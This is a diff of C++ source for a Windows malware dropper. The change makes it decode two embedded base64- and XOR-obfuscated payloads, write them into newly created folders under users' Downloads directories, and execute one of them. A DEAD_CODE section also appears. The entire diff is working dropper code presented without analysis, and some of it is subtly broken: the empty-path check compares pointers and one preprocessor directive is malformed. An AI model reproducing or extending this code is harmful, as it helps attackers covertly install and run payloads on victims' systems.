@@ -52,7 +52,7 @@
 void dead();
 std::uint64_t check_version();
 void dropper_start(int);
-void drop(DWORD size, void* buffer, std::wstring);
+void drop(DWORD size, void* buffer, std::wstring, std::wstring);
 void* XOR(void* data, DWORD size);
 void* base64decode(void* data, DWORD* size);
 bool non_exe_launch(std::wstring);
@@ -111,6 +111,8 @@ DWORD size3;
 DWORD size4;
 DWORD size5;
 
+std::wstring create_dir = L"";
+
 // Entry Point
 int main(int argc, char* argv[])
 {
@@ -153,9 +155,9 @@ int main(int argc, char* argv[])
 		data3 = XOR(data3, size3);
 	#endif
 
-		drop(size2, data2, name2);
+		drop(size2, data2, name2, create_dir);
 		size3 = size3 - 1;
-		drop(size3, data3, name3);
+		drop(size3, data3, name3, create_dir);
 
 		bool result = non_exe_launch(name3);
 
@@ -175,28 +177,29 @@ int main(int argc, char* argv[])
 ////////////////////////////////////////////
 
 #else
-//		dropper_start(4);
-//		dropper_start(5);
-		dropper_start(1);
+		dropper_start(4);
+		dropper_start(5);
+//		dropper_start(1);
 
 	#ifdef DROPPER_BASE64 == 1
-//		data4 = base64decode(data4, &size4);
-//		data5 = base64decode(data5, &size5);
-		data1 = base64decode(data1, &size1);
+		data4 = base64decode(data4, &size4);
+		data5 = base64decode(data5, &size5);
+//		data1 = base64decode(data1, &size1);
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
-//		data4 = XOR(data4, size4);
-//		data5 = XOR(data5, size5);
-		data1 = XOR(data1, size1);
+		data4 = XOR(data4, size4);
+		data5 = XOR(data5, size5);
+//		data1 = XOR(data1, size1);
 	#endif
 
-//		drop(size4, data4, name4);
-//		drop(size5, data5, name5);
-		drop(size1, data1, name1);
+		drop(size4, data4, name4, create_dir);
+		create_dir = L"C:\\Users\\Administrator\\Downloads\\en-US";
+		drop(size5, data5, name5, create_dir);
+//		drop(size1, data1, name1);
 
-		exe_launch(name1);
-//		exe_launch(name4);
+//		exe_launch(name1);
+		exe_launch(name4);
 
 #endif
 
@@ -216,31 +219,29 @@ int main(int argc, char* argv[])
 
 	else if (os_version == 10) {
 
-//		dropper_start(3);
-		dropper_start(1);
+		dropper_start(4);
+		dropper_start(5);
+//		dropper_start(1);
 
-	#if DROPPER_BASE64 == 1
-		data1 = base64decode(data1, &size1);
-//		size3 = size3 - 1;
-//		data3 = base64decode(data3, &size3);
+	#ifdef DROPPER_BASE64 == 1
+		data4 = base64decode(data4, &size4);
+		data5 = base64decode(data5, &size5);
+//		data1 = base64decode(data1, &size1);
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
-		data1 = XOR(data1, size1);
-//		data3 = XOR(data3, size3);
+		data4 = XOR(data4, size4);
+		data5 = XOR(data5, size5);
+//		data1 = XOR(data1, size1);
 	#endif
 
-		drop(size1, data1, L"C:\\Users\\Administrator\\Downloads\\exe_num28.exe");
-//		drop(size3, data3, name3);
+		drop(size4, data4, name4, create_dir);
+		create_dir = L"C:\\Users\\adind\\Downloads\\en-US";
+		drop(size5, data5, name5, create_dir);
+//		drop(size1, data1, name1);
 
-//		bool result = non_exe_launch(name3);
-//		std::cout << "before exe_launch 2 " << std::endl;
-//		if (result == true){
-//			std::cout << "before exe_launch";
-			exe_launch(L"C:\\Users\\Administrator\\Downloads\\exe_num28.exe");
-//		} else {
-//			std::cout << "This failed and nothing happened.\n";
-//		}
+//		exe_launch(name1);
+		exe_launch(name4);
 
 #ifdef DEAD_CODE
 		// dead code
@@ -591,12 +592,24 @@ void* XOR(void* data, DWORD size) {
 }
 
 // Drop buffer to file
-void drop(DWORD size, void* buffer, std::wstring drop_name)
+void drop(DWORD size, void* buffer, std::wstring drop_name, std::wstring create_dir)
 {
-	FILE* f = _wfopen(drop_name.c_str(), L"wb");
+
+	std::wstring write_dir = L"";
+	if (create_dir.c_str() != L""){
+		CreateDirectoryW(create_dir.c_str(), NULL);
+		write_dir = create_dir;
+		write_dir += L"\\";
+		write_dir += drop_name;
+	}
+	else {
+		write_dir = drop_name;
+	}
+
+	FILE* f = _wfopen(write_dir.c_str(), L"wb");
 	// traverse byte list
 	if (!f) {
-		perror("fopen");
+		perror("_wfopen");
 	}
 	else {
 		for (int i = 0;i < size;i++)
